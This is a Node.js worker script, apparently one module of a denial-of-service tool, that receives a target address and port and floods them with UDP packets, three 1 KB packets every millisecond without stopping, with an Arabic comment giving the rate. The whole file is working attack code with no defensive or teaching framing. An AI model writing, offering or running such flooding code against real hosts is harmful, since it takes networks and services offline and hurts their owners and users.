const { parentPort } = require('worker_threads');
const dgram = require('dgram');
const socket = dgram.createSocket('udp4');

parentPort.on('message', (msg) => {
    const { target, port } = msg;
    console.log(`🚀 UDP Flood started on ${target}:${port}`);
    
    setInterval(() => {
        const buffer = Buffer.alloc(1024, 'A'); // 1KB Packet
        socket.send(buffer, 0, buffer.length, port, target);
        socket.send(buffer, 0, buffer.length, port, target);
        socket.send(buffer, 0, buffer.length, port, target);
    }, 1); // إرسال 3 حزم كل 1 ميلي ثانية
});